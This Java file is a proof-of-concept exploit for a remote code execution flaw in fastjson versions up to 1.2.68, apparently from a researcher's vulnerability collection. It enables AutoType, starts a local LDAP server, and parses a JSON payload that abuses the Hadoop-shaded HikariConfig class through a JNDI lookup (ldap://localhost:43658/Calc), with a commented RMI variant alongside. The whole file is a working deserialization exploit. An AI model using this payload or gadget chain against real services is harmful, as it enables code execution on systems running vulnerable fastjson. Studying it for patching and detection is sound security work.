package com.rain.bug.fastjson.rce;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
import com.rain.bug.common.server.LdapServer;

/**
 * fastjson <= 1.2.68 RCE，需要开启AutoType (report by threedr3am to ASRC)
 *
 * <dependency>
 *       <groupId>org.apache.hadoop</groupId>
 *       <artifactId>hadoop-client-minicluster</artifactId>
 *       <version>3.2.1</version>
 * </dependency>
 *
 * @author threedr3am
 */
public class HadoopHikariPoc {
  static {
    //rmi server示例
//    RmiServer.run();

    //ldap server示例
    LdapServer.run();
  }

  public static void main(String[] args) {
    ParserConfig.getGlobalInstance().setAutoTypeSupport(true);

//    String payload = "{\"@type\":\"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig\",\"metricRegistry\":\"rmi://localhost:43657/Calc\"}";
    String payload = "{\"@type\":\"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig\",\"healthCheckRegistry\":\"ldap://localhost:43658/Calc\"}";
    JSON.parse(payload);
  }
}
